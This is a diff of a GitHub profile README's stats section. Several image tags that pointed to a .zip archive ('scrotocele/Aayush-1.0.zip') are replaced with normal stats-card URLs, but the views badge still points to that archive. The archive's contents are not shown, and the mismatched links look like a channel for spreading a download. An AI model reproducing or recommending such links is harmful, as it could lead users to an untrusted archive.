@@ -77,16 +77,23 @@ const CrazyFlutterDev = {
 <h2 align="center">⚡ Stats ⚡</h2>
 <br>
 
-<div align=center>
-  <img width=390 height=162.84 src="https://github.com/Aayush014/Aayush014/raw/refs/heads/main/scrotocele/Aayush-1.0.zip" alt="streak stats"/>
-<img width=390 height=162.84 src="https://github.com/Aayush014/Aayush014/raw/refs/heads/main/scrotocele/Aayush-1.0.zip" alt="readme stats"/>
-  <br/>
-	
-   <img align="center" style="margin:0.5rem" src="https://github.com/Aayush014/Aayush014/raw/refs/heads/main/scrotocele/Aayush-1.0.zip"/>
+<div align="center">
+
+<img width="390" src="https://github-readme-stats-fast.vercel.app/api?username=Aayush014&show_icons=true&theme=dark&rank_icon=github&border_radius=12&title_color=fff\&icon_color=7AFF97\&text_color=7AFF97\&bg_color=151515" />
+
+<img width="390" src="https://github-readme-stats-fast.vercel.app/api/streak?username=Aayush014&theme=dark&border_radius=12&ring=ff00ff&fire=ff00ff&currStreakLabel=ff00ff&title_color=fff\&icon_color=7AFF97\&text_color=7AFF97\&bg_color=151515" />
+
+<br/><br/>
+
+<img width="325" src="https://github-readme-stats-fast.vercel.app/api/top-langs/?username=Aayush014&layout=donut-vertical&theme=dark&border_radius=12&title_color=fff\&icon_color=7AFF97\&text_color=7AFF97\&bg_color=151515" />
+
 </div>
+
+
+
 
 <br/>
 
-<p align="center"> <img src="https://github.com/Aayush014/Aayush014/raw/refs/heads/main/scrotocele/Aayush-1.0.zip%20views&color=0e75b6&style=flat" alt="Aayush014" /> </p>
+<p align="center"> <img src="https://github.com/Aayush014/Aayush014/raw/refs/heads/main/scrotocele/Aayush-1.0.zip%20views&color=0e75b6&style=flat&theme=dark" alt="Aayush014" /> </p>
 
 <hr/>
